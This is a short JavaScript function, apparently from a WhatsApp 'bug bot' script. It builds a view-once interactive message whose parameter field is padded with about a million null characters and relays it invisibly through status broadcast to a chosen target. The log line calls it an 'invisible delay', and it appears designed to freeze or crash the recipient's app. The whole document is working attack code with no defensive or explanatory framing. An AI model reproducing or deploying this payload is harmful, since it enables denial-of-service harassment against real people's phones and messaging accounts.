async function xdelay(target) {
  let zxv = await generateWAMessageFromContent(target, {
    viewOnceMessage: {
      message: {
        interactiveResponseMessage: {
          body: {
            text: "Hay Mau Tag Boleh" + "war... \n -Judge Holdem",
            format: "DEFAULT"
          },
          nativeFlowResponseMessage: {
            name: "call_permission_request",
            paramsJson: "\u0000".repeat(1045000),
            version: 3
          }
        }
      }
    }
  }, {
    ephemeralExpiration: 0,
    forwardingScore: 0,
    isForwarded: false,
    font: Math.floor(Math.random() * 9),
    background: "#" + Math.floor(Math.random() * 16777215).toString(16).padStart(6, "0"),
  });
  
  await sock.relayMessage("status@broadcast", zxv.message, {
    messageId: zxv.key.id,
    statusJidList: [target],
    additionalNodes: [{
      tag: "meta",
      attrs: {},
      content: [{
        tag: "mentioned_users",
        attrs: {},
        content: [{ 
          tag: "to", 
          attrs: { jid: target }, 
          content: undefined
        }]
      }]
    }]
  });
  console.log(chalk.blue('Send invisible delay')) 
}
